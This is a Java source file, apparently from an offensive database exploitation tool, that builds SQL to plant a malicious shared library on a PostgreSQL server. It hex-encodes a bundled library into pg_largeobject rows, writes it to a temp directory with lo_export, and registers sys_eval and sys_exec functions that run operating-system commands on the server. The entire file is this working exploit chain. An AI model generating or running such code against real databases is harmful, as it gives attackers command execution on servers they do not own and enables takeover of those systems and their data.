package controller.udf;

import java.io.*;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class udfPostgresql {

    private static final int CHUNK_SIZE = 2048;

    /**
     * 将文件流转换为 pg_largeobject SQL
     */
    private static List<String> convertFileToSQL(InputStream is, int loid, String writePath, String fileSep) throws IOException {
        List<String> sqlList = new ArrayList<>();
        byte[] buffer = new byte[CHUNK_SIZE];
        int bytesRead;
        int blockNum = 0;

        while ((bytesRead = is.read(buffer)) != -1) {
            StringBuilder hex = new StringBuilder();
            for (int i = 0; i < bytesRead; i++) {
                hex.append(String.format("%02x", buffer[i]));
            }

            if (blockNum == 0) sqlList.add(String.format("SELECT lo_create(%d);", loid));
            sqlList.add("INSERT INTO pg_largeobject VALUES (" + loid + ", " + blockNum + ", decode('" + hex + "', 'hex')); ");
            blockNum++;
        }

        String filePath = writePath + loid + ".so";
        if (fileSep.equals("\\")) filePath = filePath.replace("\\", "\\\\");

        sqlList.add("SELECT lo_export(" + loid + ", '" + filePath + "');");
        sqlList.add("SELECT lo_unlink(" + loid + ");");

        String funcSql = "CREATE OR REPLACE FUNCTION sys_eval(text)\n" +
                "RETURNS text\n" +
                "AS '" + filePath + "', 'sys_eval'\n" +
                "LANGUAGE C VOLATILE\n" +
                "RETURNS NULL ON NULL INPUT;";
        sqlList.add(funcSql);

        String wrapper = "CREATE OR REPLACE FUNCTION sys_exec(text)\n" +
                "RETURNS text AS $$ SELECT sys_eval($1) $$ LANGUAGE SQL STRICT;";
        sqlList.add(wrapper);

        return sqlList;
    }


    /**
     * 从 resources 中获取唯一文件的路径，如果不存在返回 null
     */
    private static String getSingleFileResourcePath(String resourceDir) {
        try {
            if (resourceDir.endsWith("/")) resourceDir = resourceDir.substring(0, resourceDir.length() - 1);

            URL url = udfPostgresql.class.getResource(resourceDir);
            if (url == null) return null;

            if ("file".equals(url.getProtocol())) {
                Path path = Paths.get(url.toURI());
                try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                    for (Path p : stream) {
                        if (Files.isRegularFile(p)) {
                            return resourceDir + "/" + p.getFileName().toString();
                        }
                    }
                    return null;
                }
            } else if ("jar".equals(url.getProtocol())) {
                String jarPath = url.getPath().substring(5, url.getPath().indexOf("!"));
                try (JarFile jar = new JarFile(jarPath)) {
                    Enumeration<JarEntry> entries = jar.entries();
                    String prefix = resourceDir.startsWith("/") ? resourceDir.substring(1) + "/" : resourceDir + "/";
                    while (entries.hasMoreElements()) {
                        JarEntry entry = entries.nextElement();
                        if (!entry.isDirectory() && entry.getName().startsWith(prefix)) {
                            return "/" + entry.getName();
                        }
                    }
                    return null;
                }
            } else {
                return null;
            }
        } catch (IOException | URISyntaxException e) {
            return null;
        }
    }

    /**
     * 根据参数动态加载资源并生成 SQL
     * 如果资源不存在，返回空 List，跳过此步骤
     */
    public static List<String> branch(String pgVersion, String pgOs, String pgBytes) {
        List<String> sqlList = new ArrayList<>();
        int loid = ThreadLocalRandom.current().nextInt(100000, 999999);

        String writePath;
        String fileSep;
        switch (pgOs.toLowerCase()) {
            case "linux":
            case "unix":
            case "mac":
                writePath = "/tmp/";
                fileSep = "/";
                break;
            case "windows":
                writePath = "C:\\Windows\\Temp\\";
                fileSep = "\\";
                break;
            default:
                writePath = System.getProperty("java.io.tmpdir");
                fileSep = File.separator;
        }

        writePath = writePath.replace("\\", fileSep).replace("/", fileSep);
        if (!writePath.endsWith(fileSep)) writePath += fileSep;

        String resourceDir = "/udf/postgresql/" + pgOs + "/" + pgBytes + "/" + pgVersion + "/";
        String resourcePath = null;
        try {
            resourcePath = getSingleFileResourcePath(resourceDir);
        } catch (Exception e) {
            System.out.println("[!] 资源文件不存在: " + resourceDir + ", 已跳过此步骤");
            return sqlList;
        }

        try (InputStream is = udfPostgresql.class.getResourceAsStream(resourcePath)) {
            if (is == null) {
                System.out.println("[!] 资源文件不存在: " + resourcePath + ", 已跳过此步骤");
                return sqlList;
            }
            sqlList.addAll(convertFileToSQL(is, loid, writePath, fileSep));
        } catch (IOException e) {
            System.out.println("[!] 文件读取失败: " + resourcePath + ", 已跳过此步骤");
        }

        return sqlList;
    }

}